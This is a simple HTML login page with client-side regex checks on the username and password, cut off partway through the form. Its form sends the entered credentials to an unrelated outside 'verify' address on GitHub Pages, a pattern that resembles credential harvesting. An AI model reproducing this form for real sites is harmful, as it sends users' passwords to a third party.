<html>
<head>
  <title>Login Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background-color: #f1f1f1;
    }
    
    h2 {
      text-align: center;
      font-family: "Arial Black", sans-serif;
      color: #000;
    }
    
    .container {
      max-width: 400px;
      margin: 0 auto;
      padding: 20px;
      position: relative;
      border: 2px solid #ccc;
      border-radius: 5px;
      background-color: #fff;
    }
    
    label {
      display: block;
      margin-bottom: 10px;
      font-family: "Verdana", sans-serif;
    }
    
    input[type="text"],
    input[type="password"],
    input[type="email"] {
      width: 100%;
      padding: 8px;
      border-radius: 3px;
      border: 1px solid #ccc;
      font-family: "Arial", sans-serif;
    }
    
    button[type="submit"],
    button[type="button"] {
      display: block;
      width: 100%;
      padding: 10px;
      margin-top: 20px;
      background-color: #4caf50;
      color: #fff;
      border: none;
      border-radius: 3px;
      cursor: pointer;
      font-family: "Verdana", sans-serif;
    }
    
    #successMessage {
      font-family: "Arial Black", sans-serif;
      font-size: 24px;
      margin-top: 20px;
      color: #000;
      text-align: center;
      font-weight: bold;
    }
    
    .error {
      color: red;
      font-size: 12px;
    }
  </style>
  <script>
    window.addEventListener('DOMContentLoaded', function() {
      var loginForm = document.getElementById('loginForm');
      var usernameInput = document.getElementById('username');
      var passwordInput = document.getElementById('password');
      var errorMessage = document.getElementById('errorMessage');

      loginForm.addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent form submission

        // Retrieve form data
        var username = usernameInput.value;
        var password = passwordInput.value;

        // Validate username
        var usernameRegex = /^[a-zA-Z0-9_]{3,20}$/;
        if (!usernameRegex.test(username)) {
          errorMessage.innerText = 'Invalid username. Username must be 3-20 characters long and can contain only letters, numbers, and underscores.';
          return;
        }

        // Validate password
        var passwordRegex = /^(?=.*[A-Z]).{8,16}$/;
        if (!passwordRegex.test(password)) {
          errorMessage.innerText = 'Invalid password. Password must be 8-16 characters long and contain at least one uppercase letter.';
          return;
        }

        // Validation passed, submit the form
        loginForm.submit();
      });
    });
  </script>
</head>
<body>
  <div class="container">
    <h2>Login</h2>
    <form id="loginForm" method="post" action="https://balkanci.github.io/balkanci.github.io-verify/)">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username" required>
  
      <label for="password">Password:</label>
      <input type="password
